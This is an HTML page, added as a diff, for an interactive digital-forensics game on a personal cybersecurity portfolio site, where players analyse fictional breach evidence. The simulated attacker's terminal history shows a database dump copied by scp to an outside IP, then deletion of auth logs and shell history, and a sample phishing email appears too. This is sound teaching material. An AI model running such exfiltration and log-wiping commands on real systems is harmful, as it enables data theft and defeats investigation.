@@ -1,0 +1,462 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Digital Forensics Challenge</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="stylesheet" href="/Interactive_Section/css/digital-forensics.css">
+</head>
+<body>
+
+<!-- Header -->
+    <header>
+        <div class="container">
+            <nav>
+                <div class="logo">
+                    <a href="../../index.html" style="text-decoration: none; color: white;">
+                        <i class="fas fa-shield-alt"></i>
+                        Aziz Alghamdi عزيز الغامدي
+                    </a>
+                </div>
+                <div class="mobile-menu-btn">
+                    <i class="fas fa-bars"></i>
+                </div>
+                <ul class="nav-links">
+                    <li><a href="../../index.html">Home</a></li>
+                    <li><a href="../../index.html#about">About</a></li>
+                    <li><a href="../../index.html#education">Education</a></li>
+                    <li><a href="../../index.html#research">Research</a></li>
+                    <li><a href="../../index.html#projects">Projects</a></li>
+                    <li><a href="../../index.html#certifications">Certifications</a></li>
+                    <li><a href="../../index.html#contact">Contact</a></li>
+                </ul>
+            </nav>
+        </div>
+    </header>
+    <!-- Unique Cybersecurity Visualization -->
+    <div id="cyber-visualization" class="cyber-visualization"></div>
+    <div class="binary-bg"></div>
+    <div class="container">
+        <div class="game-header">
+            <h1 class="game-title">Digital Forensics Challenge</h1>
+            <p class="game-subtitle">Put your cybersecurity investigation skills to the test. Analyze digital evidence to solve the case and identify the culprit behind a data breach.</p>
+        </div>
+
+        <div class="game-container" id="game-container">
+            <div class="sidebar">
+                <div class="mission-brief">
+                    <h2 class="mission-title"><i class="fas fa-briefcase"></i> Mission Brief</h2>
+                    <p class="mission-desc">A financial technology company has experienced a data breach. Customer financial data was exfiltrated from their systems. Your task is to analyze the digital evidence collected and determine:</p>
+                    <ul class="mission-objectives" style="padding-left: 20px;">
+                        <li>Who was responsible for the breach</li>
+                        <li>How they gained access to the system</li>
+                        <li>What specific data was compromised</li>
+                        <li>When the breach occurred</li>
+                    </ul>
+                </div>
+
+                <div class="evidence-container">
+                    <h2 class="mission-title"><i class="fas fa-folder-open"></i> Evidence Files</h2>
+                    <ul class="evidence-list">
+                        <li class="evidence-item" data-target="evidence1">
+                            <div class="evidence-icon"><i class="fas fa-file-image"></i></div>
+                            <div class="evidence-name">Security Camera Image</div>
+                        </li>
+                        <li class="evidence-item" data-target="evidence2">
+                            <div class="evidence-icon"><i class="fas fa-file-alt"></i></div>
+                            <div class="evidence-name">System Log Excerpt</div>
+                        </li>
+                        <li class="evidence-item" data-target="evidence3">
+                            <div class="evidence-icon"><i class="fas fa-terminal"></i></div>
+                            <div class="evidence-name">Command History</div>
+                        </li>
+                        <li class="evidence-item" data-target="evidence4">
+                            <div class="evidence-icon"><i class="fas fa-envelope"></i></div>
+                            <div class="evidence-name">Suspicious Email</div>
+                        </li>
+                        <li class="evidence-item" data-target="evidence5">
+                            <div class="evidence-icon"><i class="fas fa-file-code"></i></div>
+                            <div class="evidence-name">Metadata Analysis</div>
+                        </li>
+                    </ul>
+                </div>
+
+                <div class="notebook">
+                    <h2 class="notebook-title"><i class="fas fa-book"></i> Investigator's Notebook</h2>
+                    <textarea class="notebook-content" id="notebook" placeholder="Take notes on your findings here..."></textarea>
+                    <div class="clue-counter">Clues found: <span id="clue-counter">0</span>/12</div>
+                </div>
+            </div>
+
+            <div class="work-area">
+                <div class="evidence-viewer">
+                    <div class="viewer-header">
+                        <div class="viewer-title">
+                            <i class="fas fa-search"></i>
+                            <span id="current-evidence">Select evidence to begin investigation</span>
+                        </div>
+                        <div class="viewer-controls">
+                            <button class="viewer-btn" id="zoom-in"><i class="fas fa-search-plus"></i></button>
+                            <button class="viewer-btn" id="zoom-out"><i class="fas fa-search-minus"></i></button>
+                            <button class="viewer-btn" id="analyze-btn"><i class="fas fa-microscope"></i> Analyze</button>
+                        </div>
+                    </div>
+
+                    <!-- Evidence Views -->
+                    <div class="evidence-view" id="evidence1">
+                        <div class="img-viewer">
+                            <img src="../../images/SecurityCamera.png" alt="Security camera footage showing office area" id="security-image">
+                            <p class="img-caption">Security camera footage from the server room, timestamped 2023-03-15 02:34:17</p>
+                        </div>
+                        <div class="hidden-data" id="evidence1-details">
+                            <ul>
+                                <li>Image shows afterhours access to the server room</li>
+                                <li>Person appears to be using a badge that is not their own</li>
+                                <li>Badge visible in image belongs to "Sarah Chen, IT Support"</li>
+                                <li>Person in image is not Sarah Chen</li>
+                                <li>Timestamp shows access at 2:34 AM, outside normal working hours</li>
+                            </ul>
+                        </div>
+                    </div>
+
+                    <div class="evidence-view" id="evidence2">
+                        <pre class="text-viewer">
+[2023-03-15 02:12:03] Failed login attempt for user schen@fintechcorp.com from IP 192.168.1.45
+[2023-03-15 02:12:17] Failed login attempt for user schen@fintechcorp.com from IP 192.168.1.45
+[2023-03-15 02:12:42] Failed login attempt for user schen@fintechcorp.com from IP 192.168.1.45
+[2023-03-15 02:13:05] Successful login for user schen@fintechcorp.com from IP 192.168.1.45
+[2023-03-15 02:15:32] User schen@fintechcorp.com accessed database customers_financial_records
+[2023-03-15 02:18:47] Large data export initiated by user schen@fintechcorp.com (10.2 GB)
+[2023-03-15 02:24:15] SSH connection established from IP 192.168.1.45 to external server 45.77.65.211
+[2023-03-15 02:26:33] File transfer initiated: customers_financial_records.sql to 45.77.65.211
+[2023-03-15 02:30:12] File transfer complete
+[2023-03-15 02:31:05] User schen@fintechcorp.com executed command: rm /var/log/auth.log
+[2023-03-15 02:32:44] User schen@fintechcorp.com executed command: history -c
+[2023-03-15 02:33:16] User schen@fintechcorp.com executed command: rm .bash_history
+[2023-03-15 02:35:01] User schen@fintechcorp.com logged out
+
+[2023-03-15 09:15:22] User schen@fintechcorp.com logged in from IP 192.168.1.156
+[2023-03-15 09:17:45] User schen@fintechcorp.com reported lost access badge to security
+                        </pre>
+                        <div class="hidden-data" id="evidence2-details">
+                            <ul>
+                                <li>Multiple failed login attempts indicate possible brute force attack</li>
+                                <li>Login IP (192.168.1.45) is different from Sarah's normal login IP (192.168.1.156)</li>
+                                <li>Large data export of customer financial records occurred</li>
+                                <li>Data was transferred to external IP 45.77.65.211</li>
+                                <li>Attacker attempted to erase evidence by deleting log files</li>
+                                <li>Sarah Chen reported her badge missing the next morning</li>
+                            </ul>
+                        </div>
+                    </div>
+
+                    <div class="evidence-view" id="evidence3">
+                        <div class="terminal-viewer">
+                            <div class="terminal-prompt">ssh schen@internal-database</div>
+                            <div class="terminal-output">Last login: Tue Mar 14 17:45:32 2023 from 192.168.1.156</div>
+                            <div class="terminal-prompt">cd /var/db/customers</div>
+                            <div class="terminal-prompt">ls -la</div>
+                            <div class="terminal-output">total 1.2G
+drwxr-xr-x 2 dbadmin staff    4096 Mar 14 16:30 .
+drwxr-xr-x 5 dbadmin staff    4096 Mar 10 09:12 ..
+-rw-r----- 1 dbadmin staff    1.2G Mar 14 16:30 customers_financial_records.sql
+-rw-r----- 1 dbadmin staff    2.4M Mar 14 16:30 transactions_march.sql</div>
+                            <div class="terminal-prompt">mysqldump -u admin -p customers_db > /tmp/customers_financial_records.sql</div>
+                            <div class="terminal-output">Enter password:
+******</div>
+                            <div class="terminal-prompt">scp /tmp/customers_financial_records.sql remote-user@45.77.65.211:/home/remote-user/data/</div>
+                            <div class="terminal-output">remote-user@45.77.65.211's password:
+******
+customers_financial_records.sql                          100% 10.2GB   5.8MB/s   29:45</div>
+                            <div class="terminal-prompt">whois 45.77.65.211</div>
+                            <div class="terminal-output">% Information related to '45.77.65.211'
+
+Country:     Russian Federation
+Org:         ShadowHost Services
+Admin-c:     REDACTED
+Tech-c:      REDACTED
+Created:     2022-12-10
+Last-modified: 2023-01-05</div>
+                            <div class="terminal-prompt">rm /var/log/auth.log</div>
+                            <div class="terminal-prompt">history -c</div>
+                            <div class="terminal-prompt">rm .bash_history</div>
+                            <div class="terminal-prompt">exit</div>
+                        </div>
+                        <div class="hidden-data" id="evidence3-details">
+                            <ul>
+                                <li>SSH login using Sarah Chen's credentials</li>
+                                <li>Database dump of customer financial records</li>
+                                <li>Data sent to server in Russia (45.77.65.211)</li>
+                                <li>Use of "whois" command to confirm server location</li>
+                                <li>ShadowHost Services is known to provide anonymous hosting</li>
+                                <li>Attempts to cover tracks by clearing command history</li>
+                            </ul>
+                        </div>
+                    </div>
+
+                    <div class="evidence-view" id="evidence4">
+                        <div class="email-viewer">
+                            <div class="email-header">
+                                <div class="email-field">
+                                    <span class="email-label">From:</span>
+                                    <span class="email-value">IT-Support@fintechcorp-itservices.com</span>
+                                </div>
+                                <div class="email-field">
+                                    <span class="email-label">To:</span>
+                                    <span class="email-value">schen@fintechcorp.com</span>
+                                </div>
+                                <div class="email-field">
+                                    <span class="email-label">Date:</span>
+                                    <span class="email-value">March 14, 2023 4:45 PM</span>
+                                </div>
+                                <div class="email-field">
+                                    <span class="email-label">Subject:</span>
+                                    <span class="email-value">Urgent: Password Reset Required</span>
+                                </div>
+                            </div>
+                            <div class="email-body">
+                                <p>Dear Sarah Chen,</p>
+                                <p>Our security system has detected unusual login attempts to your account. As a precautionary measure, we have temporarily locked your account.</p>
+                                <p>Please click the link below to verify your identity and reset your password:</p>
+                                <p><a href="#">https://fintechcorp-secure.com/password-reset?token=a1b2c3d4</a></p>
+                                <p>If you did not attempt to log in, please contact security immediately.</p>
+                                <p>Thank you,<br>
+                                IT Support Team<br>
+                                FinTechCorp</p>
+                                <img src="/api/placeholder/250/80" alt="FinTechCorp Logo">
+                            </div>
+                        </div>
+                        <div class="hidden-data" id="evidence4-details">
+                            <ul>
+                                <li>Phishing email sent to Sarah Chen day before breach</li>
+                                <li>Email domain "fintechcorp-itservices.com" is suspicious (legitimate would be "fintechcorp.com")</li>
+                                <li>URL "fintechcorp-secure.com" is not the company's genuine domain</li>
+                                <li>Email was sent during normal business hours to appear legitimate</li>
+                                <li>Email design and logo closely mimic official communications</li>
+                                <li>Creates urgency to trick recipient into clicking</li>
+                            </ul>
+                        </div>
+                    </div>
+
+                    <div class="evidence-view" id="evidence5">
+                        <div class="metadata-viewer">
+                            <h3>File Access Metadata Analysis</h3>
+                            <table class="metadata-table">
+                                <thead>
+                                    <tr>
+                                        <th>File</th>
+                                        <th>Last Accessed</th>
+                                        <th>Access IP</th>
+                                        <th>User</th>
+                                        <th>Access Type</th>
+                                    </tr>
+                                </thead>
+                                <tbody>
+                                    <tr>
+                                        <td>/var/db/customers/customers_financial_records.sql</td>
+                                        <td>2023-03-15 02:15:32</td>
+                                        <td>192.168.1.45</td>
+                                        <td>schen@fintechcorp.com</td>
+                                        <td>READ</td>
+                                    </tr>
+                                    <tr>
+                                        <td>/tmp/customers_financial_records.sql</td>
+                                        <td>2023-03-15 02:18:47</td>
+                                        <td>192.168.1.45</td>
+                                        <td>schen@fintechcorp.com</td>
+                                        <td>WRITE</td>
+                                    </tr>
+                                    <tr>
+                                        <td>/tmp/customers_financial_records.sql</td>
+                                        <td>2023-03-15 02:26:33</td>
+                                        <td>192.168.1.45</td>
+                                        <td>schen@fintechcorp.com</td>
+                                        <td>READ</td>
+                                    </tr>
+                                    <tr>
+                                        <td>/var/log/auth.log</td>
+                                        <td>2023-03-15 02:31:05</td>
+                                        <td>192.168.1.45</td>
+                                        <td>schen@fintechcorp.com</td>
+                                        <td>DELETE</td>
+                                    </tr>
+                                    <tr>
+                                        <td>/home/schen/.bash_history</td>
+                                        <td>2023-03-15 02:33:16</td>
+                                        <td>192.168.1.45</td>
+                                        <td>schen@fintechcorp.com</td>
+                                        <td>DELETE</td>
+                                    </tr>
+                                </tbody>
+                            </table>
+
+                            <h3 style="margin-top: 20px;">Network Connection Log</h3>
+                            <table class="metadata-table">
+                                <thead>
+                                    <tr>
+                                        <th>Timestamp</th>
+                                        <th>Source IP</th>
+                                        <th>Destination IP</th>
+                                        <th>Protocol</th>
+                                        <th>Bytes Transferred</th>
+                                    </tr>
+                                </thead>
+                                <tbody>
+                                    <tr>
+                                        <td>2023-03-14 16:42:15</td>
+                                        <td>203.0.113.42</td>
+                                        <td>192.168.1.156</td>
+                                        <td>HTTP</td>
+                                        <td>45,320</td>
+                                    </tr>
+                                    <tr>
+                                        <td>2023-03-15 02:03:22</td>
+                                        <td>203.0.113.42</td>
+                                        <td>192.168.1.45</td>
+                                        <td>SSH</td>
+                                        <td>12,864</td>
+                                    </tr>
+                                    <tr>
+                                        <td>2023-03-15 02:24:15</td>
+                                        <td>192.168.1.45</td>
+                                        <td>45.77.65.211</td>
+                                        <td>SSH/SCP</td>
+                                        <td>10,964,211,712</td>
+                                    </tr>
+                                    <tr>
+                                        <td>2023-03-15 02:35:48</td>
+                                        <td>192.168.1.45</td>
+                                        <td>203.0.113.42</td>
+                                        <td>SSH</td>
+                                        <td>8,432</td>
+                                    </tr>
+                                </tbody>
+                            </table>
+                        </div>
+                        <div class="hidden-data" id="evidence5-details">
+                            <ul>
+                                <li>External IP 203.0.113.42 connected to both Sarah's computer (192.168.1.156) and the attacker's location (192.168.1.45)</li>
+                                <li>The attacker's IP (192.168.1.45) belongs to the company guest WiFi network</li>
+                                <li>Over 10GB of data was transferred to the Russian server</li>
+                                <li>Connection from attacker back to 203.0.113.42 after data theft suggests command and control server</li>
+                                <li>Timeline matches security camera footage showing physical access to server room</li>
+                                <li>Pattern suggests coordinated attack: phishing + physical access + data exfiltration</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="solution-panel">
+                    <div class="solution-header">
+                        <h2 class="solution-title"><i class="fas fa-clipboard-check"></i> Case Solution</h2>
+                        <div class="hint-container">
+                            <button class="hint-button" id="hint-button">Need a hint?</button>
+                            <div class="hint-content" id="hint-content">
+                                <p>Look carefully at all evidence files. Pay special attention to:</p>
+                                <ul>
+                                    <li>The timeline across different evidence files</li>
+                                    <li>IP addresses and their connections</li>
+                                    <li>The phishing email domain vs. the legitimate company domain</li>
+                                    <li>Physical access evidence combined with digital evidence</li>
+                                </ul>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="solution-form" id="solution-form">
+                        <div class="form-group">
+                            <label class="form-label">Who was responsible for the breach?</label>
+                            <input type="text" class="form-control" id="solution-who" placeholder="Enter the person or group responsible">
+                        </div>
+
+                        <div class="form-group">
+                            <label class="form-label">How did they gain access to the system?</label>
+                            <textarea class="form-control" id="solution-how" rows="3" placeholder="Describe the method used to gain access"></textarea>
+                        </div>
+
+                        <div class="form-group">
+                            <label class="form-label">What data was compromised?</label>
+                            <input type="text" class="form-control" id="solution-what" placeholder="Specify the data that was stolen">
+                        </div>
+
+                        <div class="form-group">
+                            <label class="form-label">When did the breach occur? (YYYY-MM-DD HH:MM format)</label>
+                            <input type="text" class="form-control" id="solution-when" placeholder="Enter the date and time">
+                        </div>
+
+                        <button class="btn" id="submit-btn">Submit Solution</button>
+                    </div>
+
+                    <div class="feedback" id="feedback">
+                        <div class="feedback-title">
+                            <i class="fas fa-check-circle"></i>
+                            <span id="feedback-title-text">Correct!</span>
+                        </div>
+                        <p id="feedback-message"></p>
+                    </div>
+
+                    <div class="completion-container" id="completion-container">
+                        <div class="completion-badge">
+                            <i class="fas fa-user-shield"></i>
+                        </div>
+                        <h2 class="completion-title">Case Solved!</h2>
+                        <p class="completion-message">Congratulations! You've successfully solved the digital forensics case and identified the cybercriminal responsible for the data breach.</p>
+                        <p>Your analysis demonstrates strong skills in:</p>
+                        <ul style="text-align: left; max-width: 500px; margin: 0 auto; padding-left: 30px;">
+                            <li>Digital evidence analysis</li>
+                            <li>Log file interpretation</li>
+                            <li>Network traffic analysis</li>
+                            <li>Phishing detection</li>
+                            <li>Timeline reconstruction</li>
+                        </ul>
+                        <button class="btn" id="reset-btn" style="margin-top: 20px;">Solve Another Case</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+<!-- Footer -->
+    <footer>
+        <div class="container">
+            <div class="footer-content">
+                <div class="footer-about">
+                    <h3>Aziz Alghamdi</h3>
+                    <p>Cybersecurity professional specializing in digital forensics, incident response, and the application
+                        of security principles to criminal justice. Currently pursuing a Bachelor of Arts and Science in
+                        Computer Science with an emphasis on Cybersecurity and a minor in Criminal Justice.</p>
+                    <div class="social-links">
+                        <a href="https://linkedin.com" class="social-link"><i class="fab fa-linkedin-in"></i></a>
+                        <a href="https://github.com/iz2a" class="social-link"><i class="fab fa-github"></i></a>
+                        <a href="https://x.com" class="social-link"><i class="fab fa-twitter"></i></a>
+                        <a href="https://www.researchgate.net/profile/Aziz-Alghamdi-3?ev=hdr_xprf" class="social-link"><i
+                                class="fab fa-researchgate"></i></a>
+                    </div>
+                </div>
+
+                <div class="footer-links">
+                    <h3>Quick Links</h3>
+                    <ul class="quick-links">
+                        <li><a href="../../index.html#about"><i class="fas fa-chevron-right"></i> About Me</a></li>
+                        <li><a href="../../index.html#education"><i class="fas fa-chevron-right"></i> Education</a></li>
+                        <li><a href="../../index.html#research"><i class="fas fa-chevron-right"></i> Research</a></li>
+                        <li><a href="../../index.html#projects"><i class="fas fa-chevron-right"></i> Projects</a></li>
+                        <li><a href="../../index.html#certifications"><i class="fas fa-chevron-right"></i> Certifications</a></li>
+                        <li><a href="../../index.html#contact"><i class="fas fa-chevron-right"></i> Contact</a></li>
+                        <li><a href="interactive.html"><i class="fas fa-chevron-right"></i> Interactive Learning</a></li>
+                        <li><a href="../../MyResume.pdf"><i class="fas fa-chevron-right"></i> Download CV</a></li>
+                    </ul>
+                </div>
+            </div>
+
+            <div class="copyright">
+                <p>&copy; 2025 Aziz Alghamdi. All Rights Reserved.</p>
+            </div>
+        </div>
+    </footer>
+
+<script src="/Interactive_Section/javascript/digital-forensics.js"></script>
+<script src="/Interactive_Section/javascript/cyber-vis.js"></script>
+<script src="../../translator.js"></script>
+</body>
+</html>
